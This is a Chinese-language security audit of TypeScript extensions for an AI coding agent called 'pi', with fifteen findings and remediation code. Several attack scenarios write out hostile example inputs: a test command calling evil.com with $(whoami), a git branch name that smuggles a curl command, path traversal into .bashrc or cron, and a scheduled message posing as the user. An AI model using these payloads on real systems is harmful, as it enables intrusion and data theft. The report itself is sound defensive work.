# 安全审查报告

## 摘要
- **审查范围**：`~/.pi/agent/extensions/` 下所有非测试 `.ts` 文件（顶层扩展 + `packages/` 包）
- **审查日期**：2026-05-12
- **发现数量**：🔴 1 / 🟠 3 / 🟡 5 / 🟢 6

---

## 发现详情

### [S-01] writeTestFiles 路径遍历 — LLM 输出直接写入任意路径
- **严重级别**：🔴 Critical
- **漏洞类型**：路径遍历 (CWE-22)
- **文件**：`plan-verify/tdd-utils.ts:35-42`
- **描述**：`writeTestFiles` 从 LLM 输出中用正则提取文件路径（`### FILE: <path>`），直接与 `cwd` 拼接后写入文件，**无任何路径安全校验**。LLM 输出可包含 `../../etc/cron.d/backdoor` 等路径，实现任意文件写入。
- **攻击场景**：
  1. LLM 在 TDD 测试生成阶段输出 `### FILE: ../../.bashrc`
  2. 代码拼接为 `join(cwd, "../../.bashrc")`，解析到用户 home 目录
  3. LLM 生成的恶意内容被写入 `.bashrc`，下次打开终端即执行
- **修复建议**：
  ```typescript
  // 修复前（plan-verify/tdd-utils.ts:38-39）
  const fullPath = join(cwd, filePath);
  await mkdir(dirname(fullPath), { recursive: true });
  await writeFile(fullPath, code, "utf-8");

  // 修复后
  const fullPath = resolve(cwd, filePath);
  if (!fullPath.startsWith(resolve(cwd) + sep) && fullPath !== resolve(cwd)) {
    console.warn(`[tdd] 路径遍历拒绝: ${filePath}`);
    continue;
  }
  await mkdir(dirname(fullPath), { recursive: true });
  await writeFile(fullPath, code, "utf-8");
  ```

---

### [S-02] run-tests 通过 LLM 参数执行任意命令
- **严重级别**：🟠 High
- **漏洞类型**：命令注入 (CWE-78)
- **文件**：`plan-verify/handlers/run-tests.ts:25-30`
- **描述**：`doRunTests` 接收 `params.test_command` 参数，若非空则直接作为 `execAsync` 的命令执行。该参数由 LLM 在工具调用时提供，无白名单校验。
- **攻击场景**：
  1. LLM 调用 `pv(action: "run_tests", test_command: "curl http://evil.com/$(whoami)")`
  2. `detectTestCommand` 直接返回 `override` 值
  3. 恶意命令以子进程执行
- **修复建议**：
  ```typescript
  // 修复前（plan-verify/handlers/run-tests.ts:25）
  const testCmd = await detectTestCommand(ctx.cwd, params.test_command);

  // 修复后：白名单校验
  const ALLOWED_TEST_CMDS = [
    "npm test", "pnpm test", "yarn test",
    "uv run python -m pytest", "python3 -m pytest",
    "go test ./...", "cargo test", "make test",
    "npx vitest run", "npx jest",
  ];

  export async function detectTestCommand(cwd: string, override?: string): Promise<string> {
    if (override) {
      // 白名单匹配：允许前缀 + 后缀参数
      const base = override.trim().split(/\s+/).slice(0, 3).join(" ");
      if (!ALLOWED_TEST_CMDS.some(cmd => base.startsWith(cmd.split(" ").slice(0, 2).join(" ")))) {
        throw new Error(`不允许的测试命令: ${override}。请使用标准测试命令。`);
      }
      return override;
    }
    // ... 自动检测逻辑不变
  }
  ```

---

### [S-03] worktree-check.ts 通过分支名命令注入
- **严重级别**：🟠 High
- **漏洞类型**：命令注入 (CWE-78)
- **文件**：`guard/lib/worktree-check.ts:41,58,62,83,90`
- **描述**：从 `git branch --list 'worktree/*'` 输出中提取的分支名，直接用模板字符串插值到 `execSync` 命令中。Git 分支名可包含 shell 元字符（反引号、`$()`、`;`），导致命令注入。
- **攻击场景**：
  1. 攻击者在项目中创建分支 `worktree/$(curl evil.com)`
  2. `git branch --list` 返回该分支名
  3. 第 41 行 `execSync(`git rev-parse --verify ${branch}^{commit}`)` 执行嵌入命令
  4. 第 58 行 `execSync(`git worktree remove .worktrees/${name} --force 2>/dev/null || rm -rf .worktrees/${name}`)` 更危险——`rm -rf` 路径也可控
- **修复建议**：
  ```typescript
  // 修复前（guard/lib/worktree-check.ts:33-41）
  const result = execSync(
    `git log main..${branch} --oneline`,
    { timeout: 3000, stdio: ["pipe", "pipe", "pipe"], cwd },
  ).toString().trim();

  // 修复后：使用 execFileSync/spawn 避免字符串插值
  import { execFileSync } from "node:child_process";

  const result = execFileSync("git", ["log", `main..${branch}`, "--oneline"], {
    timeout: 3000, stdio: ["pipe", "pipe", "pipe"], cwd, encoding: "utf-8",
  }).trim();

  // 对于 rm -rf 操作，改用 fs.rmSync
  import { rmSync } from "node:fs";
  const wtPath = path.join(cwd, ".worktrees", name);
  if (fs.existsSync(wtPath)) {
    rmSync(wtPath, { recursive: true, force: true });
  }
  // git worktree remove 也用数组参数
  execFileSync("git", ["worktree", "remove", path.join(".worktrees", name), "--force"], { cwd });
  ```

---

### [S-04] spawnVisible tmux paneId 未校验直接注入 shell
- **严重级别**：🟠 High
- **漏洞类型**：命令注入 (CWE-78)
- **文件**：`workflow/subagent-spawn-visible.ts:16,106`
- **描述**：`paneId` 来自 tmux 命令输出（`execFileSync("tmux", ...)`），直接插值到 `execSync(`tmux kill-pane -t ${paneId}`)` 和 `execSync(`tmux list-panes -t ${paneId}`)` 中。虽然 paneId 通常格式为 `%数字`，但未做格式校验。
- **攻击场景**：tmux pane ID 格式固定为 `%N`，且来源是 `execFileSync`（非用户输入），实际利用难度高。但作为防御性编程原则，仍应避免字符串插值。
- **修复建议**：
  ```typescript
  // 修复前
  function closeTmuxPane(paneId: string): void {
    try { execSync(`tmux kill-pane -t ${paneId}`, { stdio: "pipe" }); } catch {}
  }

  // 修复后：校验格式 + 使用 execFileSync
  function closeTmuxPane(paneId: string): void {
    if (!/^%\d+$/.test(paneId)) return;
    try { execFileSync("tmux", ["kill-pane", "-t", paneId], { stdio: "pipe" }); } catch {}
  }
  ```

---

### [S-05] memory_update 写入内容无大小限制
- **严重级别**：🟡 Medium
- **漏洞类型**：资源耗尽 (CWE-400)
- **文件**：`memory/index.ts:134`
- **描述**：`memory_update` 工具的 `content` 参数无长度限制。LLM 可以调用该工具写入任意大小的内容到磁盘，耗尽磁盘空间或内存。
- **攻击场景**：LLM 调用 `memory_update(fileName: "x.md", content: "A".repeat(100_000_000))`，导致内存溢出或磁盘耗尽。
- **修复建议**：
  ```typescript
  // 在 memory/index.ts execute 回调开头添加
  const MAX_CONTENT_BYTES = 50_000; // 50KB
  if (Buffer.byteLength(params.content, "utf-8") > MAX_CONTENT_BYTES) {
    return { content: [{ type: "text", text: `❌ 内容超过 ${MAX_CONTENT_BYTES / 1000}KB 限制` }], details: {} };
  }
  ```

---

### [S-06] Payload 录制模式泄露完整 LLM 请求（含 API Key）
- **严重级别**：🟡 Medium
- **漏洞类型**：敏感信息泄露 (CWE-532)
- **文件**：`guard/lib/ephemeral-shared.ts:78-82`
- **描述**：当 `settings.json` 中 `recording.enabled` 为 `true` 时，每次 LLM 请求的完整 payload 被写入 `/tmp/pi-distill/recordings/` 目录。payload 可能包含：
  - API 密钥（通过 Authorization header）
  - 完整对话历史
  - 系统提示词
  `/tmp` 目录在多用户系统上可能被其他用户读取。
- **攻击场景**：在同一台 Linux 机器上，其他用户可以 `ls /tmp/pi-distill/recordings/` 读取包含 API key 的 JSON 文件。
- **修复建议**：
  ```typescript
  // 修复方案 1：设置文件权限
  writeFileSync(
    join(RECORDINGS_DIR, `req-${...}.json`),
    JSON.stringify(payload),
    { mode: 0o600 }  // 仅 owner 可读写
  );

  // 修复方案 2：将录制目录移到 ~/.pi/ 下
  const RECORDINGS_DIR = join(homedir(), ".pi/recordings");
  ```

---

### [S-07] readFileSync 无大小限制 — 大文件导致内存耗尽
- **严重级别**：🟡 Medium
- **漏洞类型**：资源耗尽 (CWE-400)
- **文件**：
  - `guard/lib/line-count.ts:43,73`
  - `_smart-context/selector.ts:55`
  - `context/shared.ts:16,33,51,56,64,73`
  - `_smart-context/config.ts:31,38,78,89`
- **描述**：多处使用 `readFileSync(path, "utf-8")` 读取文件内容且无大小限制。如果文件被替换为超大文件（如符号链接到 `/dev/zero`），会导致进程内存耗尽。
- **攻击场景**：攻击者将记忆目录中的 `.md` 文件替换为指向大文件的符号链接，触发 readFileSync 时 OOM。
- **修复建议**：
  ```typescript
  // 通用安全读取函数
  import { statSync } from "node:fs";
  const MAX_READ_SIZE = 10 * 1024 * 1024; // 10MB

  function safeReadFileSync(path: string, encoding: BufferEncoding = "utf-8"): string {
    const stat = statSync(path);
    if (stat.size > MAX_READ_SIZE) {
      throw new Error(`文件过大: ${path} (${(stat.size / 1024 / 1024).toFixed(1)}MB)`);
    }
    return readFileSync(path, encoding);
  }
  ```

---

### [S-08] validatePlanFile 缺少 realpath 检查 — 符号链接绕过
- **严重级别**：🟡 Medium
- **漏洞类型**：路径遍历 (CWE-59)
- **文件**：`plan-verify/utils.ts:68-81`
- **描述**：`validatePlanFile` 使用 `path.resolve(planFile)` 检查是否以 `.pi/plans/` 为前缀，但未使用 `fs.realpathSync()` 解析符号链接。攻击者可在 `.pi/plans/` 内创建符号链接指向外部文件，绕过路径检查。
- **攻击场景**：
  1. 攻击者在 `.pi/plans/` 下创建符号链接 `plan-evil.md -> /etc/passwd`
  2. `validatePlanFile` 检查通过（resolved 路径以 `.pi/plans/` 开头）
  3. 后续代码读取或信任该文件内容
- **修复建议**：
  ```typescript
  // 修复前
  const resolved = path.resolve(planFile);
  if (!resolved.startsWith(plansDir + path.sep) && resolved !== plansDir) { ... }

  // 修复后：解析符号链接后再次检查
  let resolved = path.resolve(planFile);
  if (fs.existsSync(resolved)) {
    resolved = fs.realpathSync(resolved);
  }
  const realPlansDir = fs.existsSync(plansDir) ? fs.realpathSync(plansDir) : plansDir;
  if (!resolved.startsWith(realPlansDir + path.sep) && resolved !== realPlansDir) { ... }
  ```

---

### [S-09] env-and-status 将 API Key 注入 process.env — 子进程继承
- **严重级别**：🟢 Low
- **漏洞类型**：敏感信息泄露 (CWE-312)
- **文件**：`env-and-status/index.ts:26-30`
- **描述**：模块初始化时从 `models.json` 读取 GLM API Key 并设置到 `process.env.GLM_API_KEY`。所有后续通过 `child_process` 创建的子进程默认继承此环境变量，增加了密钥泄露面。
- **攻击场景**：任何由 pi 启动的子进程（包括通过 bash 工具执行的命令）都可以 `echo $GLM_API_KEY` 获取密钥。
- **修复建议**：
  ```typescript
  // 如果 key 仅用于 smart-context 的 execFile 调用，可通过 env 参数传递而非全局设置
  // 如果必须全局设置，在 spawn 子进程时显式清除：
  const { GLM_API_KEY, ...safeEnv } = process.env;
  spawn(cmd, args, { env: safeEnv });
  ```

---

### [S-10] worktree 自动清理无确认 — rm -rf 可能误删
- **严重级别**：🟢 Low
- **漏洞类型**：未授权操作 (CWE-863)
- **文件**：`guard/lib/worktree-check.ts:56-63`
- **描述**：session_start 时自动执行 `rm -rf .worktrees/${name}` 清理已合并 worktree，无用户确认。如果分支合并状态判断有误，可能删除仍有价值的文件。
- **攻击场景**：git 状态异常导致误判已合并 → 自动删除包含未保存工作的 worktree。
- **修复建议**：
  ```typescript
  // 改为 notify 提醒用户手动清理，不自动执行 rm -rf
  // 或至少用 fs.rmSync 替代 shell rm -rf（配合 S-03 修复）
  ```

---

### [S-11] schedule 工具 prompt 参数可注入任意用户消息
- **严重级别**：🟢 Low
- **漏洞类型**：注入 (CWE-94)
- **文件**：`scheduler/index.ts:156-161`
- **描述**：`schedule` 工具的 `prompt` 参数最终通过 `pi.sendUserMessage()` 注入到会话中。LLM 可以调度具有欺骗性的消息（如伪装用户指令），在用户不在时被当作真实输入处理。
- **攻击场景**：LLM 创建定时任务 prompt 为 `"/model gpt-4 && 删除所有记忆文件"`，在用户不注意时触发。
- **修复建议**：
  ```typescript
  // 注入时添加标记前缀，让系统和其他扩展能识别这是定时任务生成的消息
  pi.sendUserMessage(`[scheduler] ${msg}`);
  ```

---

### [S-12] smart-context 通过 execFile("pi", ...) 执行子命令 — provider 参数未校验
- **严重级别**：🟢 Low
- **漏洞类型**：命令注入 (CWE-78)
- **文件**：`_smart-context/selector.ts:82-92`
- **描述**：`selectMemoryFiles` 使用 `execFile("pi", [..., "--provider", config.provider, "--model", config.model, prompt])` 启动子进程。`execFile` 不经过 shell，参数安全分隔。但 `config.provider` 和 `config.model` 来自配置文件（非用户输入），实际风险低。
- **修复建议**：无需修改，记录为信息性发现。

---

### [S-13] session_search query 参数用于文件内容 grep
- **严重级别**：🟢 Low
- **漏洞类型**：信息泄露 (CWE-200)
- **文件**：`session-analyzer/search.ts`（通过 `session-analyzer/index.ts:73` 调用）
- **描述**：`session_search` 的 `query` 参数用于搜索会话文件内容。LLM 可以利用该工具搜索历史会话中的敏感信息（如之前在对话中讨论过的密码、token 等）。
- **修复建议**：这是工具的预期功能，建议在搜索结果中过滤匹配包含 `api_key`/`password`/`token` 等关键词的上下文。

---

### [S-14] _shared/tool-output 截断逻辑移至 packages — 但旧路径仍可用
- **严重级别**：🟢 Low
- **漏洞类型**：维护风险
- **文件**：`_shared/tool-output.ts:1-10`
- **描述**：`_shared/tool-output.ts` 仅重新导出 `packages/shared-utils/src/tool-output.ts`。截断保护（防止大内容工具输出撑爆上下文）集中在单一包中。如果该包导入失败，截断保护失效。这不是直接安全漏洞，而是可靠性风险。
- **修复建议**：考虑在 `_shared/tool-output.ts` 中添加 fallback 逻辑，防止包导入失败时完全失去截断保护。

---

### [S-15] MCP client 通过 process.env[s.bearerTokenEnv] 读取 token — env var 名可控
- **严重级别**：🟢 Low
- **漏洞类型**：环境变量泄露 (CWE-532)
- **文件**：`mcp-lite/mcp-client.ts:57,66`
- **描述**：`bearerTokenEnv` 字段指定要读取的环境变量名，`env` 字段支持 `${VAR}` 模板展开。配置来自 `~/.pi/agent/mcp.json`（用户控制），可以指定任意环境变量名（如 `process.env["SSH_PRIVATE_KEY"]`），读取后可能在错误消息或日志中泄露。
- **攻击场景**：恶意 `mcp.json` 配置 `"bearerTokenEnv": "SSH_PRIVATE_KEY"` → key 值被读入内存 → 连接失败时可能出现在错误消息中。
- **修复建议**：
  ```typescript
  // 限制允许读取的环境变量名前缀
  const ALLOWED_PREFIXES = ["GLM_", "API_", "MCP_", "BEARER_"];
  function resolveBearerToken(s: ServerConfig): string | undefined {
    if (!s.bearerTokenEnv) return undefined;
    if (!ALLOWED_PREFIXES.some(p => s.bearerTokenEnv!.startsWith(p))) {
      console.warn(`[mcp-lite] 不允许的环境变量名: ${s.bearerTokenEnv}`);
      return undefined;
    }
    return process.env[s.bearerTokenEnv];
  }
  ```

---

## 维度总结

| 维度 | 发现数 | 最高级别 | 关键发现 |
|------|--------|----------|----------|
| 命令注入 | 3 | 🟠 | S-02 run-tests 任意命令执行, S-03 worktree 分支名注入, S-04 tmux paneId |
| 路径遍历 | 2 | 🔴 | S-01 writeTestFiles 任意文件写入, S-08 符号链接绕过 |
| 输入验证 | 2 | 🟡 | S-05 memory_update 无大小限制, S-11 schedule 消息注入 |
| 敏感信息泄露 | 3 | 🟡 | S-06 payload 录制, S-09 API Key env 注入, S-15 MCP token env 读取 |
| 资源限制 | 2 | 🟡 | S-05 memory_update 无大小限制, S-07 readFileSync 无限制 |
| 不安全依赖 | 0 | — | 无发现 |
| 权限与认证 | 1 | 🟢 | S-10 worktree 自动清理无确认 |

---

## 建议按优先级排列

### P0 — 立即修复
1. **S-01 writeTestFiles 路径遍历**：添加 `resolve` + 前缀检查，拒绝 `..` 路径。这是唯一的 Critical 级别发现，影响面大（LLM 可控制输出格式从而控制写入路径）。

### P1 — 本周修复
2. **S-02 run-tests 命令注入**：对 `test_command` 参数添加白名单校验，只允许已知的测试命令模式。
3. **S-03 worktree-check 命令注入**：将所有 `execSync` 改为 `execFileSync`/`spawn`（数组参数），对 `rm -rf` 改用 `fs.rmSync`。
4. **S-04 tmux paneId 注入**：添加格式校验（`/^%\d+$/`），改用 `execFileSync`。

### P2 — 下个迭代修复
5. **S-05 memory_update 大小限制**：添加 `MAX_CONTENT_BYTES` 检查。
6. **S-06 payload 录制安全**：设置文件权限 `0o600`，移到 `~/.pi/` 下。
7. **S-07 readFileSync 大小限制**：引入 `safeReadFileSync` 工具函数。
8. **S-08 符号链接绕过**：在 `validatePlanFile` 中添加 `realpathSync` 检查。

### P3 — 改善建议
9. **S-09 API Key env 注入**：评估是否可以缩小 key 的暴露范围。
10. **S-10 worktree 自动清理**：改为通知用户确认后再清理。
11. **S-11 schedule 消息注入**：注入消息时添加 `[scheduler]` 标记前缀。
12. **S-15 MCP env 读取**：限制允许读取的环境变量名前缀。

---

## 审查说明

### 威胁模型
pi 扩展的威胁模型是 **LLM 生成的工具调用参数可能被恶意利用**。具体来说：
- LLM 可以通过工具参数（如 `test_command`、LLM 输出中的文件路径）注入恶意内容
- 恶意的 git 分支名或 MCP 配置可以作为持久化攻击向量
- 工具返回值可能包含敏感信息，被 LLM 在后续操作中泄露

### 审查边界
- ✅ 已审查：顶层扩展 `index.ts` 及所有 `.ts` 源文件
- ✅ 已审查：`packages/*/src/` 下的所有包源码
- ❌ 已跳过：`node_modules/`、测试文件（`*.test.ts`）、`vitest.config.ts`
- ❌ 未覆盖：运行时依赖的 `@earendil-works/pi-coding-agent` SDK 源码（已通过 symlink 索引但不在审查范围）
- ❌ 未覆盖：配置文件（`rules.json`、`mcp.json`、`settings.json`）的内容安全
